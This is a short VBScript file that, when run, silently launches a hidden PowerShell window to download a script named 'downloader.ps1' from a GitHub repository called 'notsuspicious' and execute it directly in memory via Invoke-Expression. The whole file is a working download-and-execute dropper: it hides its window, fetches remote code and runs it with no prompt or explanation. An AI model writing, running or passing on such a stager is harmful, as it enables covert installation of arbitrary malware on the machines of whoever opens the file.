Dim objShell
Set objShell = CreateObject("WScript.Shell")

' Define the command to execute PowerShell script from the web
command = "powershell -WindowStyle Hidden -Command ""Invoke-Expression ((Invoke-WebRequest -Uri 'https://github.com/RaupenInspektor/notsuspicious/raw/main/downloader.ps1' -UseBasicParsing).Content)"""

' Execute the command
objShell.Run command, 0, True
